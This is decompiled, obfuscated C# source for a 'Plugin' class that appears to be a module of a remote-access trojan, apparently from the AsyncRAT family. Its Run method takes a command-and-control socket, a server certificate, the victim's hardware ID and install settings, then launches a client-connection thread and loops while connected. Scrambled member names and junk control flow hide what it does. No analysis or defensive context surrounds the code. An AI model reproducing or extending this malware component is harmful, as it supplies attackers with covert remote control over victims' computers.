using System;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using HsZcU78F13T1yLWI1V;

namespace Plugin;

public class Plugin
{
	[Serializable]
	[CompilerGenerated]
	private sealed class _003C_003Ec
	{
		public static readonly _003C_003Ec _003C_003E9;

		public static ThreadStart _003C_003E9__1_0;

		internal static _003C_003Ec WNwW89uM9dHWCCRfNIa;

		[MethodImpl(MethodImplOptions.NoInlining)]
		static _003C_003Ec()
		{
			int num = 1;
			while (true)
			{
				int num2 = num;
				do
				{
					IL_0012:
					switch (num2)
					{
					default:
						_003C_003E9 = new _003C_003Ec();
						num2 = 2;
						if (true)
						{
							num2 = 2;
						}
						goto IL_0012;
					case 2:
						return;
					case 1:
						break;
					}
					NhsnvEqJAcZPxwd7CAT();
					num2 = 0;
				}
				while (0 == 0);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public _003C_003Ec()
		{
			NhsnvEqJAcZPxwd7CAT();
			base._002Ector();
			int num = 0;
			if (1 == 0)
			{
				num = 0;
			}
			switch (num)
			{
			case 0:
				break;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal void _003CRun_003Eb__1_0()
		{
			Connection.InitializeClient();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void NhsnvEqJAcZPxwd7CAT()
		{
			WkMgYHbfSUMGdoITRx.UaxVEsuzWFTQk();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static bool t5RJTNursxSBG0Yikw5()
		{
			return WNwW89uM9dHWCCRfNIa == null;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static _003C_003Ec PVVNBguzHpuN6CGHvLU()
		{
			return WNwW89uM9dHWCCRfNIa;
		}
	}

	public static Socket Socket;

	internal static Plugin GWBrsvNDN9T9EYT2Yce;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bdos, string install)
	{
		int num = 5;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				ThreadStart threadStart;
				switch (num2)
				{
				case 4:
					Connection.ServerCertificate = certificate;
					num2 = 6;
					continue;
				case 2:
				case 7:
					if (!SgiCR0NtW5h9mkYlPNm())
					{
						num2 = 1;
						if (GCPLQmNF0BDPr6Cny2G() == null)
						{
							continue;
						}
						break;
					}
					goto default;
				case 6:
					gGAb49NLrJKGQenMLZx(hwid);
					num2 = 3;
					continue;
				case 5:
					Socket = socket;
					num = 4;
					break;
				case 1:
					return;
				default:
					QFvJXuNEORACZxMcsWO(1000, aZcnSKanXj1NTlfRx5R.HEQaJJTa2J);
					num2 = 7;
					if (GCPLQmNF0BDPr6Cny2G() != null)
					{
						num2 = 2;
					}
					continue;
				case 3:
					threadStart = _003C_003Ec._003C_003E9__1_0;
					if (threadStart != null)
					{
						goto IL_010d;
					}
					num2 = 8;
					continue;
				case 8:
					{
						threadStart = (_003C_003Ec._003C_003E9__1_0 = [MethodImpl(MethodImplOptions.NoInlining)] () =>
						{
							Connection.InitializeClient();
						});
						goto IL_010d;
					}
					IL_010d:
					WJXx18NjN5J0YPKR4jb(new Thread(threadStart), rw5tcZVJaEkNI8B1Xd.MfeqR70LU);
					num2 = 2;
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public Plugin()
	{
		gStj3GNxy059QDGw9Jp();
		base._002Ector();
		int num = 0;
		if (false)
		{
			int num2;
			num = num2;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void gGAb49NLrJKGQenMLZx(object P_0)
	{
		Connection.Hwid = (string)P_0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void WJXx18NjN5J0YPKR4jb(object P_0, object P_1)
	{
		rw5tcZVJaEkNI8B1Xd.UXKaDWyvn(P_0, (rw5tcZVJaEkNI8B1Xd)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void QFvJXuNEORACZxMcsWO(int P_0, object P_1)
	{
		aZcnSKanXj1NTlfRx5R.UXKaDWyvn(P_0, (aZcnSKanXj1NTlfRx5R)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool SgiCR0NtW5h9mkYlPNm()
	{
		return Connection.IsConnected;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool z5ToVoNgpZhDZP9Lylf()
	{
		return GWBrsvNDN9T9EYT2Yce == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Plugin GCPLQmNF0BDPr6Cny2G()
	{
		return GWBrsvNDN9T9EYT2Yce;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void gStj3GNxy059QDGw9Jp()
	{
		WkMgYHbfSUMGdoITRx.UaxVEsuzWFTQk();
	}
}
